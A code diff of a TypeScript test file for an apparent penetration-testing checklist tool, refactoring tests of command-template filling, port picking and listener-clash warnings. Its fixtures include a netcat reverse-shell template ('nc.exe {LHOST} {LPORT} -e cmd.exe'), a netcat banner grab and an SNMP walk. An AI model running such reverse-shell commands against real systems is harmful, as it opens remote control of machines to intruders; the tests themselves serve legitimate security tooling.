@@ -7,9 +7,10 @@ import { GoalRow } from "../features/checklist/GoalRow/GoalRow";
 import { goalCommands } from "../features/checklist/goalCommands";
 import { PortChip } from "../features/checklist/PortChip/PortChip";
 import { usePortPickStore } from "../features/checklist/portPick";
-import { setImported } from "../engines/library/store";
+import type { LibraryCommand } from "../engines/library/types";
 import type { FillInput } from "../engines/checklist";
 import type { Engagement } from "../types/engagement";
+import { commandText } from "../features/commands/filledCommand";
 
 /** The declarations of one rule in a feature sheet (jsdom loads no CSS, so layout rules are read from the source). */
 const rule = (file: string, selector: string) => {
@@ -72,7 +73,7 @@ describe("new credential notice", () => {
 
 describe("CommandList spacing", () => {
   it("separates commands with gap-4 and mutes the description", () => {
-    render(<CommandList commands={[{ id: "a", title: "Desc A", text: "id", unresolved: [], msfMarker: false }, { id: "b", title: "Desc B", text: "ls", unresolved: [], msfMarker: false }]} />);
+    render(<CommandList commands={[commandText({ id: "a", title: "Desc A", text: "id" }), commandText({ id: "b", title: "Desc B", text: "ls" })]} />);
     const ul = screen.getAllByRole("list")[0];
     expect(ul).toHaveClass("command-list");
     expect(rule("src/features/checklist/CommandList/CommandList.scss", ".command-list")).toMatch(/gap: var\(--space-lg\);/);
@@ -93,40 +94,40 @@ describe("{PORT} on checklist steps", () => {
     servicesByHost: new Map([["h1", [svc(8080), svc(22), svc(80)]]]), tunnels: [], attackerIp: "10.10.14.1", listenerPort: "4444",
   });
   it("fills the lowest port, offers all, and a pick refills", () => {
-    setImported({ cards: [], commands: [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never] });
+    const library: LibraryCommand[] = [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
     usePortPickStore.setState({ picks: {} });
     const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
-    let c = goalCommands("h-enum-identified", input(), eng).commands.find((x) => x.id === "nc")!;
-    expect(c.text).toContain("10.0.0.5 22");
+    let c = goalCommands("h-enum-identified", input(), eng, library).commands.find((x) => x.id === "nc")!;
+    expect(c.shown).toContain("10.0.0.5 22");
     expect(c.portToken?.choices).toEqual([22, 80, 8080]);
     render(<PortChip commands={[c]} />);
     expect(screen.getByRole("combobox", { name: "Port" })).toHaveTextContent("22");
     usePortPickStore.getState().set(c.portToken!.key, 8080);
-    c = goalCommands("h-enum-identified", input(), eng).commands.find((x) => x.id === "nc")!;
-    expect(c.text).toContain("10.0.0.5 8080");
+    c = goalCommands("h-enum-identified", input(), eng, library).commands.find((x) => x.id === "nc")!;
+    expect(c.shown).toContain("10.0.0.5 8080");
     void within;
   });
   it("offers no fake port: a UDP open|filtered port makes no chip and leaves {PORT} unresolved", () => {
-    setImported({ cards: [], commands: [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never] });
+    const library: LibraryCommand[] = [{ id: "nc", title: "Banner", template: "nc -nv {TARGET_IP} {PORT}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
     usePortPickStore.setState({ picks: {} });
     const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
     const base = input();
     const udp = { id: "s7", hostId: "h1", port: 7, protocol: "udp", state: "open|filtered", name: "echo" } as never;
     const inp = { ...base, servicesByHost: new Map([["h1", [udp, svc(80), svc(22)]], ["h2", [svc(9)]]]) } as FillInput;
-    const c = goalCommands("h-enum-identified", inp, eng).commands.find((x) => x.id === "nc")!;
+    const c = goalCommands("h-enum-identified", inp, eng, library).commands.find((x) => x.id === "nc")!;
     expect(c.portToken?.choices).toEqual([22, 80]);
     const none = { ...base, servicesByHost: new Map([["h1", [udp]]]) } as FillInput;
-    const n = goalCommands("h-enum-identified", none, eng).commands.find((x) => x.id === "nc")!;
+    const n = goalCommands("h-enum-identified", none, eng, library).commands.find((x) => x.id === "nc")!;
     expect(n.portToken).toBeUndefined();
-    expect(n.text).toContain("{PORT}");
+    expect(n.shown).toContain("{PORT}");
     expect(n.unresolved).toContain("PORT");
     const { container } = render(<PortChip commands={[n]} />);
     expect(container).toBeEmptyDOMElement();
   });
   it("shows no chip when no displayed command uses {PORT}", () => {
-    setImported({ cards: [], commands: [{ id: "snmp", title: "SNMP", template: "snmpwalk -v2c -c public {TARGET_IP}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never] });
+    const library: LibraryCommand[] = [{ id: "snmp", title: "SNMP", template: "snmpwalk -v2c -c public {TARGET_IP}", goals: ["h-enum-identified"], os: "any", runFrom: "attacker" } as never];
     const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
-    const cmds = goalCommands("h-enum-identified", input(), eng).commands.filter((x) => x.id === "snmp");
+    const cmds = goalCommands("h-enum-identified", input(), eng, library).commands.filter((x) => x.id === "snmp");
     expect(cmds).toHaveLength(1);
     expect(cmds[0].portToken).toBeUndefined();
     const { container } = render(<PortChip commands={cmds} />);
@@ -144,19 +145,19 @@ describe("{LPORT} clash with a logged listener", () => {
   const rev = { id: "rev", title: "Reverse shell", template: 'nc.exe {LHOST} {LPORT} -e cmd.exe', goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never;
 
   it("warns and names the next free port when {LPORT} is already a logged listener", () => {
-    setImported({ cards: [], commands: [rev] });
+    const library: LibraryCommand[] = [rev];
     const input = { ...base(), listenerPorts: new Set([4444, 4445]) };
-    const c = goalCommands("h-enum-identified", input, eng).commands.find((x) => x.id === "rev")!;
+    const c = goalCommands("h-enum-identified", input, eng, library).commands.find((x) => x.id === "rev")!;
     expect(c.portClash).toEqual({ port: 4444, suggested: 4446 });
     render(<CommandList commands={[c]} />);
     expect(screen.getByText(/port 4444 already has a listener; try 4446/)).toBeInTheDocument();
   });
 
   it("stays quiet when the port is free or the command has no {LPORT}", () => {
-    setImported({ cards: [], commands: [rev, { id: "noport", title: "x", template: "whoami", goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never] });
-    const free = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([9001]) }, eng).commands.find((x) => x.id === "rev")!;
+    const library: LibraryCommand[] = [rev, { id: "noport", title: "x", template: "whoami", goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never];
+    const free = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([9001]) }, eng, library).commands.find((x) => x.id === "rev")!;
     expect(free.portClash).toBeUndefined();
-    const noLport = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([4444]) }, eng).commands.find((x) => x.id === "noport")!;
+    const noLport = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([4444]) }, eng, library).commands.find((x) => x.id === "noport")!;
     expect(noLport.portClash).toBeUndefined();
   });
 });
